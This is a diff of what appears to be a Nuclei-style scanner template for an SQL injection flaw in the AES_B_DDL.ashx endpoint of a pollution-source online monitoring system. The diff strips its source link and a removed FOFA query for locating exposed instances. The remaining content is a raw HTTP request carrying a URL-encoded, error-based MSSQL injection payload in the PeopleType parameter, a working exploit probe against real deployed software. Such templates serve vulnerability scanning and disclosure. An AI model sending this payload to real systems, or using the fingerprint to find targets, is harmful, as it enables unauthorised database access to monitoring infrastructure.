@@ -3,12 +3,8 @@ info:
   name: 污染源在线监控系统AES_B_DDL.ashx 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rmqx3hxev0xw8nio'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: rmqx3hxev0xw8nio
-    fofa: body="ImgGwry/download.png" || (body="images/errorpage.gif" && body="错误页面") || body="污染源在线监控系统"
 http:
 - raw:
   - 'GET /ashx/AES_B_DDL.ashx?CurrentSelect=11&PeopleType=%27%20AND%208691%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%28UNICODE%28SQUARE%28NULL%29%29%20IS%20NULL%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28118%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29--%20WnxP HTTP/1.1
